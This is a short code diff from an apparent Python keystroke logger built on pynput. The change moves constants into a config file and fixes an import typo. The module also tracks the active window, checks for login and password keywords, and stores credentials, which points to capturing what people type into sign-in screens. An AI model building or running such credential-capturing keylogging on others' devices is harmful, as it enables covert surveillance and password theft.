@@ -11,11 +11,7 @@ from pynput import keyboard
 from storage.db import log_keystrokes_batch
 from tracker.window_tracker import get_active_window
 from storage.security import encrypt_and_store_credential
-
-# Constants for sensitive input detection
-SENSITIVE_KEYWORDS = ["login", "sign in", "password", "auth"]
-BATCH_SIZE = 20
-FLUSH_INTERVAL = 1.0  # seconds
+from config.settings import SENSITIVE_KEYWORDS, BATCH_SIZE, FLUSH_INTERVAL
 
 # Global variables for keystroke logging
 event_queue = queue.Queue()
@@ -29,7 +25,7 @@ def get_logger():
     """Get the main logger instance, initializing it if necessary."""
     global main_logger
     if main_logger is None:
-        from logging_utls.logger import init_logger
+        from logging_utils.logger import init_logger
         main_logger = init_logger("KEYSTROKE")
     return main_logger
 
